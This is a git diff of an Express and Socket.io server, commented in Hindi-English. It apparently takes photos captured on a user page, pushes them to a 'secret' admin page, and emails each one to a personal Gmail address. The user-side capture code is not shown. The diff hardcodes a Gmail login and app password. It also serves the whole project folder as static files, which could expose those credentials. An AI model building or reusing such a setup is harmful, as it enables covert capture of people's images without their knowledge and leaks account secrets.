@@ -9,44 +9,43 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-// Folder setup for local uploads
+// Local uploads folder
 const uploadDir = path.join(__dirname, 'uploads');
 if (!fs.existsSync(uploadDir)) {
     fs.mkdirSync(uploadDir);
 }
 
-// Static files serve
-app.use(express.static(__dirname));
-app.use(express.static(path.join(__dirname, 'public')));
-app.use('/uploads', express.static(uploadDir));
-
-// Gmail Transporter Setup
+// Gmail Config
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: 'prectice05@gmail.com',       // 👈 Apni Gmail ID yahan dalein
-        pass: 'includestdiosystem'   // 👈 Gmail App Password yahan dalein
+        user: 'prectice@gmail.com',       // 👈 Apni Gmail ID verify karein
+        pass: 'includestdiosystem'   // 👈 16-digit App Password verify karein
     }
 });
 
-// ROUTING - Single exact path definition
+// Explicit Routes (Sabse pehle rakhe hain taaki 'Cannot GET' na aaye)
 
-// 1. Root Route -> Direct User Page
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'user.html'));
-});
-
-// 2. Secret Admin Route
+// 1. Secret Admin Route
 app.get('/admin.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'admin.html'));
 });
 
-// 3. User Route
+// 2. User Route
 app.get('/user.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'user.html'));
 });
 
-// Socket.io connection logic
+// 3. Main URL -> Direct User Page
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'user.html'));
+});
+
+// Serve static assets after custom routes
+app.use(express.static(__dirname));
+app.use('/uploads', express.static(uploadDir));
+
+// Socket.io Events
 io.on('connection', (socket) => {
     console.log('⚡ Connected Device ID:', socket.id);
 
@@ -66,8 +65,8 @@ io.on('connection', (socket) => {
         io.emit('send-photo-to-admin', imageData);
 
         const mailOptions = {
-            from: 'prectice05@gmail.com',  // 👈 Apni Gmail ID
-            to: 'md.danish7499@gmail.com',    // 👈 Jis par email mangwana hai
+            from: 'prectice@gmail.com',
+            to: 'md.danish7499@gmail.com',
             subject: '📸 New Photo Captured!',
             text: 'User page se new photo capture ho gayi hai.',
             attachments: [{ filename: fileName, content: base64Data, encoding: 'base64' }]
